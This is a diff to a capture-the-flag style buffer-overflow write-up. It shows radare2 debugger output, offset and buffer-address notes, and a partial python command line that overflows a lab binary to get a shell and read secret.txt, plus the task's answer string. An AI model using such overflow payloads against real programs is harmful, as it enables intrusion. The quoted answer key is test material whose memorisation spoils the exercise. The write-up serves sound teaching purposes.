@@ -1122,7 +1122,6 @@ child stopped with signal 11
 [+] SIGNAL 11 errno=0 addr=0x41414141 code=1 ret=0
 [0x41414141]> dr rip
 0x41414141
-[0x41414141]>
 ```
 while here get the stackpointer address: dr rsp
 ```
@@ -1148,9 +1147,8 @@ rflags = 0x00010202
 orax = 0xffffffffffffffff
 [0x41414141]> dr rsp
 0x7fffffffe2d0
-[0x41414141]> 
 ```
-```
+
 Now in summary what we have:
 offset = 167
 buf_addr = 0x7fffffffe2c0          # var_90h from radare2
@@ -1199,10 +1197,10 @@ payload += rip
 \u2502           0x004005a9      90             nop
 \u2502           0x004005aa      c9             leave
 \u2514           0x004005ab      c3             ret
-[0x00400527]> 
-
 ```
+
 Final run:
+
 ```
 overflow-4]$ ./buffer-overflow-2 $(python -c "print(
 > '\x90'*90 +
@@ -1220,6 +1218,4 @@ sh-4.2$ cat secret.txt
 wowanothertime!!
 sh-4.2$ 
 ```
-
-
-### Question 1: Use the same method to read the contents of the secret file! Answer: wowanothertime!!
+### Question 1 Task 9: Use the same method to read the contents of the secret file! Answer: wowanothertime!!
